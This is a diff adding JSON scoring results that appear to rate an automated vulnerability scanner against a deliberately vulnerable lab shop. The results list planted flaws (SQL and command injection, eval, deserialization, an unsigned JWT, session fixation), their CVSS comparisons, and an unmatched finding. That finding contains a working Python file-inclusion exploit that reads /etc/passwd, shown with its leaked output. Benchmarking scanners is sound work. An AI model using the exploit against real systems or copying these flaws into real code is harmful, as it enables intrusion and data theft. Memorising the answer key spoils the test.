+            "S": "U",
+            "C": "N",
+            "I": "H",
+            "A": "N"
+          },
+          "severity": "medium"
+        },
+        "cvss_error": null,
+        "cvss_status": "compared",
+        "cvss_score_delta": 0.0,
+        "cvss_score_error": 0.0,
+        "cvss_score_ok": true,
+        "cvss_vector_ok": true,
+        "severity_expected": "medium",
+        "severity_reported": "medium",
+        "severity_ok": true
+      }
+    },
+    {
+      "id": "21",
+      "truth_id": "21",
+      "title": "会话固定",
+      "class": "session_fixation",
+      "detected": true,
+      "finding_id": "0e642f7c599c4d2a8a0e1973916b983b",
+      "scoring_locations": [
+        {
+          "path": "app/src/bootstrap.php",
+          "line": 13,
+          "line_sha256": "51ba4456e570a6e82e11c7e63c95004fe219b2474f825e6f03a4b7478acd86e1",
+          "rationale": "关闭会话严格模式，允许接受未初始化的外部会话 ID。"
+        },
+        {
+          "path": "app/src/bootstrap.php",
+          "line": 17,
+          "line_sha256": "6b0b26071dd19abb23b0a3ce89387c7f527c3cd0dac38d62c6265f0dada38bf7",
+          "rationale": "显式将外部提供 ID 设置为会话 ID。"
+        },
+        {
+          "path": "app/public/auth/login.php",
+          "line": 3,
+          "line_sha256": "4512a29dd995273eb616faa731118a9663017d83d2899fdb315a719a56a283e2",
+          "rationale": "登录入口接受 sid 并传入会话启动逻辑。"
+        },
+        {
+          "path": "app/public/auth/login.php",
+          "line": 8,
+          "line_sha256": "a273818ddbe6b1ba72e6e4449153382e8ae3ed865e0e88311325b708183fb23f",
+          "rationale": "认证成功仅设置 user_id，未重新生成会话 ID。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/src/bootstrap.php",
+          "line": 13
+        },
+        {
+          "path": "app/public/auth/login.php",
+          "line": 8
+        }
+      ],
+      "primary_location": {
+        "path": "lab30-shop/app/public/auth/login.php",
+        "line": 3
+      },
+      "rating": {
+        "cvss_expected": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 8.1,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "N",
+            "UI": "R",
+            "S": "U",
+            "C": "H",
+            "I": "H",
+            "A": "N"
+          },
+          "severity": "high"
+        },
+        "cvss_reported": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 7.1,
+          "base_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:L",
+          "metrics": {
+            "AV": "N",
+            "AC": "H",
+            "PR": "N",
+            "UI": "R",
+            "S": "U",
+            "C": "H",
+            "I": "H",
+            "A": "L"
+          },
+          "severity": "high"
+        },
+        "cvss_error": null,
+        "cvss_status": "compared",
+        "cvss_score_delta": -1.0,
+        "cvss_score_error": 1.0,
+        "cvss_score_ok": false,
+        "cvss_vector_ok": false,
+        "severity_expected": "high",
+        "severity_reported": "high",
+        "severity_ok": true
+      }
+    },
+    {
+      "id": "22",
+      "truth_id": "22",
+      "title": "会员兑换码弱类型比较绕过",
+      "class": "weak_type_comparison",
+      "detected": true,
+      "finding_id": "5a0a00576fa249cfb5ad3466c54cf27f",
+      "scoring_locations": [
+        {
+          "path": "app/public/account/redeem.php",
+          "line": 5,
+          "line_sha256": "660f9f18c8c95ea97a893d82b67cd5a2839f4b5720bee01cdf36503fa9a1048e",
+          "rationale": "MD5 摘要采用 == 弱比较，数字形式摘要触发类型转换。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/account/redeem.php",
+          "line": 5
+        }
+      ],
+      "primary_location": {
+        "path": "lab30-shop/app/public/account/redeem.php",
+        "line": 5
+      },
+      "rating": {
+        "cvss_expected": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 4.3,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "L",
+            "UI": "N",
+            "S": "U",
+            "C": "N",
+            "I": "L",
+            "A": "N"
+          },
+          "severity": "medium"
+        },
+        "cvss_reported": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 3.1,
+          "base_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "H",
+            "PR": "L",
+            "UI": "N",
+            "S": "U",
+            "C": "N",
+            "I": "L",
+            "A": "N"
+          },
+          "severity": "low"
+        },
+        "cvss_error": null,
+        "cvss_status": "compared",
+        "cvss_score_delta": -1.2,
+        "cvss_score_error": 1.2,
+        "cvss_score_ok": false,
+        "cvss_vector_ok": false,
+        "severity_expected": "medium",
+        "severity_reported": "low",
+        "severity_ok": false
+      }
+    },
+    {
+      "id": "23",
+      "truth_id": "23",
+      "title": "会员查询跨文件 SQL 注入",
+      "class": "sqli",
+      "detected": false,
+      "finding_id": null,
+      "scoring_locations": [
+        {
+          "path": "app/src/member_lookup.php",
+          "line": 3,
+          "line_sha256": "a7d93b540dbfb5dc4ad5ae70d79c16c1cf24201f488f728a5b9481a365451c1b",
+          "rationale": "跨文件传入的检索词在公共函数中拼接 SQL 并 query。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/ops/members.php",
+          "line": 2
+        },
+        {
+          "path": "app/src/member_lookup.php",
+          "line": 3
+        }
+      ],
+      "primary_location": null
+    },
+    {
+      "id": "24",
+      "truth_id": "24",
+      "title": "主机巡检跨文件命令注入",
+      "class": "command_injection",
+      "detected": false,
+      "finding_id": null,
+      "scoring_locations": [
+        {
+          "path": "app/src/host_check.php",
+          "line": 2,
+          "line_sha256": "fa0699fdd4a540a46ac8bd99e7eea2771d121362ac5dfc6b561d4625372954fa",
+          "rationale": "公共巡检函数将调用方 host 直接拼入 shell_exec。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/ops/batch-check.php",
+          "line": 2
+        },
+        {
+          "path": "app/src/host_check.php",
+          "line": 2
+        }
+      ],
+      "primary_location": null
+    },
+    {
+      "id": "25",
+      "truth_id": "25",
+      "title": "个人主页 HTML 属性注入型 XSS",
+      "class": "xss_r",
+      "detected": true,
+      "finding_id": "7d425e28404445b7b8301548aba889b1",
+      "scoring_locations": [
+        {
+          "path": "app/public/account/profile.php",
+          "line": 3,
+          "line_sha256": "1ae1b7787fc2d28cd30e6f9b1089657e3fa3d486ce673efc0899d8c3fc6b7b88",
+          "rationale": "用户 URL 未经属性编码或协议校验直接进入 href 属性。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/account/profile.php",
+          "line": 3
+        }
+      ],
+      "primary_location": {
+        "path": "lab30-shop/app/public/account/profile.php",
+        "line": 3
+      },
+      "rating": {
+        "cvss_expected": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 6.1,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "N",
+            "UI": "R",
+            "S": "C",
+            "C": "L",
+            "I": "L",
+            "A": "N"
+          },
+          "severity": "medium"
+        },
+        "cvss_reported": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 5.4,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "N",
+            "UI": "R",
+            "S": "U",
+            "C": "L",
+            "I": "L",
+            "A": "N"
+          },
+          "severity": "medium"
+        },
+        "cvss_error": null,
+        "cvss_status": "compared",
+        "cvss_score_delta": -0.7,
+        "cvss_score_error": 0.7,
+        "cvss_score_ok": false,
+        "cvss_vector_ok": false,
+        "severity_expected": "medium",
+        "severity_reported": "medium",
+        "severity_ok": true
+      }
+    },
+    {
+      "id": "26",
+      "truth_id": "26",
+      "title": "合作方结算 JWT 未校验签名身份伪造",
+      "class": "auth_bypass",
+      "detected": true,
+      "finding_id": "966576d2146344879dcbedc45dc3fcca",
+      "scoring_locations": [
+        {
+          "path": "app/public/partner/portal.php",
+          "line": 2,
+          "line_sha256": "b9e89e5ab7438cdd6c57b4695e78e0c27c084b2b9e014863735300b25ef4dc77",
+          "rationale": "仅 Base64 解码 JWT 负载，未核验签名。"
+        },
+        {
+          "path": "app/public/partner/portal.php",
+          "line": 3,
+          "line_sha256": "f3b86cdd20addf7e6c3445c9dd4b44360c28f32138a8e697a7a6a864d2616ea2",
+          "rationale": "对未验签负载中的 role 直接进行管理员授权。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/partner/portal.php",
+          "line": 2
+        }
+      ],
+      "primary_location": {
+        "path": "lab30-shop/app/public/partner/portal.php",
+        "line": 2
+      },
+      "rating": {
+        "cvss_expected": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 5.3,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "N",
+            "UI": "N",
+            "S": "U",
+            "C": "L",
+            "I": "N",
+            "A": "N"
+          },
+          "severity": "medium"
+        },
+        "cvss_reported": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 8.6,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "N",
+            "UI": "N",
+            "S": "C",
+            "C": "H",
+            "I": "N",
+            "A": "N"
+          },
+          "severity": "high"
+        },
+        "cvss_error": null,
+        "cvss_status": "compared",
+        "cvss_score_delta": 3.3,
+        "cvss_score_error": 3.3,
+        "cvss_score_ok": false,
+        "cvss_vector_ok": false,
+        "severity_expected": "medium",
+        "severity_reported": "high",
+        "severity_ok": false
+      }
+    },
+    {
+      "id": "27",
+      "truth_id": "27",
+      "title": "任务导入反序列化链命令执行",
+      "class": "insecure_deserialization",
+      "detected": true,
+      "finding_id": "fe228c9b642d456694f9b45fb29d5e92",
+      "scoring_locations": [
+        {
+          "path": "app/public/ops/jobs.php",
+          "line": 3,
+          "line_sha256": "779c09d981ca0cb034e29b4414e7765c323dbc4d54ec268aa3a0991978e4ad27",
+          "rationale": "用户任务在实例检查前执行不受限 unserialize，触发生命周期方法。"
+        },
+        {
+          "path": "app/src/dispatch_job.php",
+          "line": 4,
+          "line_sha256": "8257b36671b583b23b53f8a98081627109cb9e6ec6f44eb4a661e97ef128f868",
+          "rationale": "反序列化触发 __wakeup 并对对象控制的 command 执行 shell_exec。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/ops/jobs.php",
+          "line": 3
+        },
+        {
+          "path": "app/src/dispatch_job.php",
+          "line": 4
+        }
+      ],
+      "primary_location": {
+        "path": "lab30-shop/app/public/ops/jobs.php",
+        "line": 3
+      },
+      "rating": {
+        "cvss_expected": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 7.2,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "H",
+            "UI": "N",
+            "S": "U",
+            "C": "H",
+            "I": "H",
+            "A": "H"
+          },
+          "severity": "high"
+        },
+        "cvss_reported": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 8.8,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "L",
+            "UI": "N",
+            "S": "U",
+            "C": "H",
+            "I": "H",
+            "A": "H"
+          },
+          "severity": "high"
+        },
+        "cvss_error": null,
+        "cvss_status": "compared",
+        "cvss_score_delta": 1.6,
+        "cvss_score_error": 1.6,
+        "cvss_score_ok": false,
+        "cvss_vector_ok": false,
+        "severity_expected": "high",
+        "severity_reported": "high",
+        "severity_ok": true
+      }
+    },
+    {
+      "id": "28",
+      "truth_id": "28",
+      "title": "会员报表二次 SQL 注入",
+      "class": "sqli",
+      "detected": true,
+      "finding_id": "5aff729ccaaa4480a9e526a947f58de9",
+      "scoring_locations": [
+        {
+          "path": "app/public/ops/report.php",
+          "line": 3,
+          "line_sha256": "c828247b5cfc2b4b842f36335ad318dd7aa58e039a0406db76f8fd74c6ad721d",
+          "rationale": "从数据库读出的可控昵称再次拼接 SQL，属于二次 SQL 注入实际执行点。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/account/update.php",
+          "line": 6
+        },
+        {
+          "path": "app/public/ops/report.php",
+          "line": 3
+        }
+      ],
+      "primary_location": {
+        "path": "lab30-shop/app/public/ops/report.php",
+        "line": 3
+      },
+      "rating": {
+        "cvss_expected": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 3.5,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "L",
+            "UI": "R",
+            "S": "U",
+            "C": "N",
+            "I": "L",
+            "A": "N"
+          },
+          "severity": "low"
+        },
+        "cvss_reported": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 4.8,
+          "base_vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:N/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "H",
+            "PR": "L",
+            "UI": "R",
+            "S": "U",
+            "C": "H",
+            "I": "N",
+            "A": "N"
+          },
+          "severity": "medium"
+        },
+        "cvss_error": null,
+        "cvss_status": "compared",
+        "cvss_score_delta": 1.3,
+        "cvss_score_error": 1.3,
+        "cvss_score_ok": false,
+        "cvss_vector_ok": false,
+        "severity_expected": "low",
+        "severity_reported": "medium",
+        "severity_ok": false
+      }
+    },
+    {
+      "id": "29",
+      "truth_id": "29",
+      "title": "营销排版模板表达式执行",
+      "class": "code_execution",
+      "detected": true,
+      "finding_id": "cbc0430810e6455eabc064331bd9a754",
+      "scoring_locations": [
+        {
+          "path": "app/public/ops/template-render.php",
+          "line": 3,
+          "line_sha256": "dce9c9b6051abbea490f77e5af24055a7311da63daa6862bc540fee1f649b0b9",
+          "rationale": "用户模板表达式直接进入 eval 动态执行。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/ops/template-render.php",
+          "line": 3
+        }
+      ],
+      "primary_location": {
+        "path": "lab30-shop/app/public/ops/template-render.php",
+        "line": 3
+      },
+      "rating": {
+        "cvss_expected": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 7.2,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "H",
+            "UI": "N",
+            "S": "U",
+            "C": "H",
+            "I": "H",
+            "A": "H"
+          },
+          "severity": "high"
+        },
+        "cvss_reported": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 8.8,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "L",
+            "UI": "N",
+            "S": "U",
+            "C": "H",
+            "I": "H",
+            "A": "H"
+          },
+          "severity": "high"
+        },
+        "cvss_error": null,
+        "cvss_status": "compared",
+        "cvss_score_delta": 1.6,
+        "cvss_score_error": 1.6,
+        "cvss_score_ok": false,
+        "cvss_vector_ok": false,
+        "severity_expected": "high",
+        "severity_reported": "high",
+        "severity_ok": true
+      }
+    },
+    {
+      "id": "30",
+      "truth_id": "30",
+      "title": "会员资料批量赋值敏感字段修改",
+      "class": "mass_assignment",
+      "detected": true,
+      "finding_id": "618fed4dab94434c9f2d11308ca4829e",
+      "scoring_locations": [
+        {
+          "path": "app/public/account/update.php",
+          "line": 4,
+          "line_sha256": "52d8c65d3ed7239c41a68274ea9cb6d3ab0bf41ea8945e006464c7b8f762bcee",
+          "rationale": "普通会员可编辑字段清单错误包含 role、balance、tier 敏感属性。"
+        },
+        {
+          "path": "app/public/account/update.php",
+          "line": 5,
+          "line_sha256": "a96d906676e0d81d568b03b0235a3fdb05d7d1c1d5d0a37eddfed7d440b8d1a2",
+          "rationale": "根据过宽字段清单接受客户端敏感属性。"
+        },
+        {
+          "path": "app/public/account/update.php",
+          "line": 6,
+          "line_sha256": "3b4287334996f92bbb92739759cd27a4b85216d00e46f82fc385085fbffa097f",
+          "rationale": "预处理仅保护值语法，仍把无权修改的敏感字段持久化。"
+        }
+      ],
+      "location": [
+        {
+          "path": "app/public/account/update.php",
+          "line": 4
+        },
+        {
+          "path": "app/public/account/update.php",
+          "line": 6
+        }
+      ],
+      "primary_location": {
+        "path": "lab30-shop/app/public/account/update.php",
+        "line": 6
+      },
+      "rating": {
+        "cvss_expected": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 7.1,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "L",
+            "UI": "N",
+            "S": "U",
+            "C": "L",
+            "I": "H",
+            "A": "N"
+          },
+          "severity": "high"
+        },
+        "cvss_reported": {
+          "version": "3.1",
+          "score_basis": "Base",
+          "base_score": 7.1,
+          "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N",
+          "metrics": {
+            "AV": "N",
+            "AC": "L",
+            "PR": "L",
+            "UI": "N",
+            "S": "U",
+            "C": "L",
+            "I": "H",
+            "A": "N"
+          },
+          "severity": "high"
+        },
+        "cvss_error": null,
+        "cvss_status": "compared",
+        "cvss_score_delta": 0.0,
+        "cvss_score_error": 0.0,
+        "cvss_score_ok": true,
+        "cvss_vector_ok": true,
+        "severity_expected": "high",
+        "severity_reported": "high",
+        "severity_ok": true
+      }
+    }
+  ],
+  "duplicates": [],
+  "unmatched": [
+    {
+      "id": "755caa0a9ce04369bac0bc106f3406d2",
+      "run_id": "2969bcf204cd43b5baf2683cbb0e841d",
+      "unit_id": "b08ad4f2b4974e2eaf2faa0e183c562b",
+      "fingerprint": "aa94a83c96b8c6277b759995a511da02",
+      "category": "task_goal:v2:476e08867647b189b3bb:1",
+      "title": "运营远程模板预览将 GET template 直接 include 造成任意本地文件包含",
+      "severity": "high",
+      "summary": "GET template 被直接拼入 include，既接受相对/绝对本地路径，也接受 URL（默认值即 http://fixtures:8080/templates/season.php），无 basename、目录白名单或 realpath 前缀校验，operator/admin 会话即可包含任意本地文件，远程包含取决于 allow_url_include。",
+      "evidence": [
+        {
+          "path": "lab30-shop/app/public/ops/template-preview.php",
+          "start_line": 1,
+          "end_line": 3
+        },
+        {
+          "path": "lab30-shop/app/src/bootstrap.php",
+          "start_line": 33,
+          "end_line": 36
+        }
+      ],
+      "input_source": "$_GET['template']",
+      "propagation": "$_GET['template'] -> $template -> include $template",
+      "dangerous_operation": "include 攻击者控制的文件路径或 URL",
+      "protection": "require_user(['operator','admin']) 仅检查角色，无路径白名单；check_csrf 不适用于 GET",
+      "preconditions": [
+        "拥有 operator 或 admin 会话；远程包含还需 allow_url_include=On 且存在可控远程 PHP 文件"
+      ],
+      "missing_context": [],
+      "poc": {
+        "filename": "lfi_template_preview.py",
+        "language": "python",
+        "script": "import os, re, urllib.request, urllib.parse, http.cookiejar\nbase = os.environ['LAB30_URL'].rstrip('/')\njar = http.cookiejar.CookieJar()\nopener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))\nbody = opener.open(base + '/auth/login.php', timeout=10).read().decode('utf-8', 'replace')\nfields = {'username': os.environ['LAB30_USER'], 'password': os.environ['LAB30_PASSWORD']}\nm = re.search(r'name=\"csrf\" value=\"([^\"]+)\"', body)\nif m: fields['csrf'] = m.group(1)\nr = opener.open(urllib.request.Request(base + '/auth/login.php', data=urllib.parse.urlencode(fields).encode(), method='POST'), timeout=10)\nprint('login', r.status)\ndef fetch(t):\n    u = base + '/ops/template-preview.php?' + urllib.parse.urlencode({'template': t})\n    r = opener.open(u, timeout=10)\n    return r.status, r.read().decode('utf-8', 'replace')\nprint('normal', fetch('http://fixtures:8080/templates/season.php')[0])\nprint('attack', fetch('/etc/passwd'))",
+        "instructions": "设置 LAB30_URL、LAB30_USER、LAB30_PASSWORD 后运行；脚本自行登录，比较默认远程模板与 /etc/passwd 的响应正文。",
+        "normal_input": "template=http://fixtures:8080/templates/season.php",
+        "attack_input": "template=/etc/passwd",
+        "expected_result": "正常输入加载远程模板内容；攻击输入在 #remote-template 区域回显 /etc/passwd 内容（如 root:x:0:0），证明任意文件包含。"
+      },
+      "remediation": "不要把请求参数直接传给 include；改用固定的模板 ID 到文件路径映射白名单，并用 realpath 校验目标位于允许目录内，禁用远程包含。",
+      "validation_state": "candidate",
+      "validation_errors": [],
+      "verdict": null,
+      "created_at": "2026-10-30T14:02:08.006366+00:00",
+      "finding_kind": "vulnerability",
+      "revision": 1,
+      "superseded_summary": [],
+      "derived_from_finding_id": null,
+      "disposition": "open",
+      "disposition_reason": null,
+      "disposition_by": null,
+      "disposition_at": null,
+      "project_finding_id": "84652dd95a814ae4b7d93fcd84a65de5",
+      "project_revision": 10,
+      "verification_status": "verified",
+      "verification_verdict": "confirmed",
+      "cvss": {
+        "version": "3.1",
+        "score_basis": "Base",
+        "base_score": 7.6,
+        "base_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L",
+        "metrics": {
+          "AV": "N",
+          "AC": "L",
+          "PR": "L",
+          "UI": "N",
+          "S": "U",
+          "C": "H",
+          "I": "L",
+          "A": "L"
+        },
+        "severity": "high"
+      },
+      "cvss_assessment": {
+        "status": "scored",
+        "source": "auto",
+        "assessment_revision": 1,
+        "conclusion_revision": 1,
+        "engine_version": "cvss31-base-1",
+        "metric_details": {
+          "AV": {
+            "value": "N",
+            "rationale": "通过 HTTP GET 访问运营页面",
+            "evidence": [
+              {
+                "path": "lab30-shop/app/public/ops/template-preview.php",
+                "start_line": 2,
+                "end_line": 3,
+                "snapshot_id": "586b79b41f8e4f59be80f2a9b548902b"
+              }
+            ],
+            "assumption": false,
+            "issues": []
+          },
+          "AC": {
+            "value": "L",
+            "rationale": "直接修改 template 参数路径即可",
+            "evidence": [
+              {
+                "path": "lab30-shop/app/public/ops/template-preview.php",
+                "start_line": 2,
+                "end_line": 3,
+                "snapshot_id": "586b79b41f8e4f59be80f2a9b548902b"
+              }
+            ],
+            "assumption": false,
+            "issues": []
+          },
+          "PR": {
+            "value": "L",
+            "rationale": "需 operator/admin 会话",
+            "evidence": [
+              {
+                "path": "lab30-shop/app/src/bootstrap.php",
+                "start_line": 33,
+                "end_line": 36,
+                "snapshot_id": "586b79b41f8e4f59be80f2a9b548902b"
+              }
+            ],
+            "assumption": false,
+            "issues": []
+          },
+          "UI": {
+            "value": "N",
+            "rationale": "攻击者自身会话触发",
+            "evidence": [
+              {
+                "path": "lab30-shop/app/public/ops/template-preview.php",
+                "start_line": 2,
+                "end_line": 3,
+                "snapshot_id": "586b79b41f8e4f59be80f2a9b548902b"
+              }
+            ],
+            "assumption": false,
+            "issues": []
+          },
+          "S": {
+            "value": "U",
+            "rationale": "包含在应用进程内执行",
+            "evidence": [
+              {
+                "path": "lab30-shop/app/public/ops/template-preview.php",
+                "start_line": 3,
+                "end_line": 3,
+                "snapshot_id": "586b79b41f8e4f59be80f2a9b548902b"
+              }
+            ],
+            "assumption": false,
+            "issues": []
+          },
+          "C": {
+            "value": "H",
+            "rationale": "可包含并读取任意可读 PHP/文件内容",
+            "evidence": [
+              {
+                "path": "lab30-shop/app/public/ops/template-preview.php",
+                "start_line": 3,
+                "end_line": 3,
+                "snapshot_id": "586b79b41f8e4f59be80f2a9b548902b"
+              }
+            ],
+            "assumption": false,
+            "issues": []
+          },
+          "I": {
+            "value": "L",
+            "rationale": "包含可执行文件的 PHP 代码可能产生副作用，取决于被包含文件",
+            "evidence": [
+              {
+                "path": "lab30-shop/app/public/ops/template-preview.php",
+                "start_line": 3,
+                "end_line": 3,
+                "snapshot_id": "586b79b41f8e4f59be80f2a9b548902b"
+              }
+            ],
+            "assumption": false,
+            "issues": []
+          },
+          "A": {
+            "value": "L",
+            "rationale": "被包含文件的执行程度影响可用性",
+            "evidence": [
+              {
+                "path": "lab30-shop/app/public/ops/template-preview.php",
+                "start_line": 3,
+                "end_line": 3,
+                "snapshot_id": "586b79b41f8e4f59be80f2a9b548902b"
+              }
+            ],
+            "assumption": false,
+            "issues": []
+          }
+        },
+        "issues": [],
+        "created_at": "2026-10-30T14:02:08.006469+00:00",
+        "snapshot_id": "586b79b41f8e4f59be80f2a9b548902b",
+        "run_id": "2969bcf204cd43b5baf2683cbb0e841d"
+      },
+      "legacy_severity": null,
+      "vulnerability_type": "lfi",
+      "primary_location": {
+        "path": "lab30-shop/app/public/ops/template-preview.php",
+        "line": 3
+      },
+      "verifications": [
+        {
+          "id": "8495a233fb2f4e0f8107473a455c9469",
+          "finding_id": "755caa0a9ce04369bac0bc106f3406d2",
+          "created_at": "2026-10-30T14:32:12.524572+00:00",
+          "execution_status": "success",
+          "verdict": "confirmed",
+          "original_script": "{'filename': 'lfi_template_preview.py', 'language': 'python', 'script': 'import os, re, urllib.request, urllib.parse, http.cookiejar\\nbase = os.environ[\\'LAB30_URL\\'].rstrip(\\'/\\')\\njar = http.cookiejar.CookieJar()\\nopener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))\\nbody = opener.open(base + \\'/auth/login.php\\', timeout=10).read().decode(\\'utf-8\\', \\'replace\\')\\nfields = {\\'username\\': os.environ[\\'LAB30_USER\\'], \\'password\\': os.environ[\\'LAB30_PASSWORD\\']}\\nm = re.search(r\\'name=\"csrf\" value=\"([^\"]+)\"\\', body)\\nif m: fields[\\'csrf\\'] = m.group(1)\\nr = opener.open(urllib.request.Request(base + \\'/auth/login.php\\', data=urllib.parse.urlencode(fields).encode(), method=\\'POST\\'), timeout=10)\\nprint(\\'login\\', r.status)\\ndef fetch(t):\\n    u = base + \\'/ops/template-preview.php?\\' + urllib.parse.urlencode({\\'template\\': t})\\n    r = opener.open(u, timeout=10)\\n    return r.status, r.read().decode(\\'utf-8\\', \\'replace\\')\\nprint(\\'normal\\', fetch(\\'http://fixtures:8080/templates/season.php\\')[0])\\nprint(\\'attack\\', fetch(\\'/etc/passwd\\'))', 'instructions': '设置 LAB30_URL、LAB30_USER、LAB30_PASSWORD 后运行；脚本自行登录，比较默认远程模板与 /etc/passwd 的响应正文。', 'normal_input': 'template=http://fixtures:8080/templates/season.php', 'attack_input': 'template=/etc/passwd', 'expected_result': '正常输入加载远程模板内容；攻击输入在 #remote-template 区域回显 /etc/passwd 内容（如 root:x:0:0），证明任意文件包含。'}",
+          "modified_script": "import os,urllib.request,urllib.parse,urllib.error,http.cookiejar\nB=os.environ['LAB30_URL'].rstrip('/')\ncj=http.cookiejar.CookieJar();o=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))\no.open(B+'/auth/login.php',timeout=10).read()\no.open(B+'/auth/login.php',timeout=10,data=urllib.parse.urlencode({'username':os.environ['LAB30_USER'],'password':os.environ['LAB30_PASSWORD']}).encode()).read()\ndef fetch(t):\n u=B+'/ops/template-preview.php'+(('?'+urllib.parse.urlencode({'template':t})) if t is not None else '')\n try:\n  r=o.open(u,timeout=10);return r.status,r.read().decode('utf-8','replace')\n except urllib.error.HTTPError as e:\n  return e.code,e.read().decode('utf-8','replace')\ndef snip(b,key):\n i=b.find(key)\n return repr(b[max(0,i-180):i+220]) if i>=0 else 'NOT_FOUND'\ns,b=fetch('http://fixtures:8080/templates/season.php');print('NORMAL_REMOTE',s,'ROOT','root:x:0:0' in b);print('NORMAL_REMOTE_SNIP',snip(b,'remote-template'))\ns,b=fetch(None);print('EMPTY',s,'ROOT','root:x:0:0' in b)\ns,b=fetch('/etc/passwd');print('ATTACK',s,'ROOT','root:x:0:0' in b,'BASH','/bin/bash' in b);print('ATTACK_SNIP',snip(b,'root:x:0:0'))",
+          "modification_notes": "",
+          "target_version": "lab30-shop-1.0.0",
+          "command": "",
+          "expected_result": "",
+          "normal_observation": "正常侧：operator 会话下 GET /ops/template-preview.php?template=http://fixtures:8080/templates/season.php 返回 NORMAL_REMOTE 200，<section id=\"remote-template\"> 渲染远程模板内容“合作方 · 秋日生活提案 / 让生活慢下来，把好物带回家。”，不含 /etc/passwd 内容（ROOT False）；不传 template 时返回 EMPTY 200 且无 include 内容。",
+          "attack_observation": "攻击侧 GET /ops/template-preview.php?template=/etc/passwd 返回 200，页面 <section id=\"remote-template\"> 内原文回显 'root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:...'（ROOT True、BASH True），即 GET 参数被直接 include 为本地绝对路径，泄露任意可读文件内容。",
+          "browser_execution": false,
+          "notes": "作业 147d495941874bcf9c442a3e8a521ee7（identity=operator，exit_code=0，evidence_usable=true）stdout 同时给出三组观测：默认远程 URL 返回 200 且 #remote-template 渲染“合作方 · 秋日生活提案”（ROOT False，说明远程 include 亦生效、allow_url_include 未禁止）；无 template 参数 200 且 ROOT False（空模板不 include）；/etc/passwd 时 ROOT True/BASH True 并给出原文片段。源码 template-preview.php:2 require_user(['operator','admin'])，:3 if($template!=='')include $template，无 basename/白名单/realpath 校验。角色前提来自源码，故使用 operator；先前 alice 作业 80f80ec7058b4fdf90264fda825fc1bf 返回 403 仅说明角色前提，未作为漏洞证据。",
+          "files": [],
+          "source": "poc_agent",
+          "status": "verified",
+          "agent": {
+            "context_id": "767394c7c493447896fb434c0adf6ebb",
+            "identity": "alice",
+            "identity_attempts": [
+              {
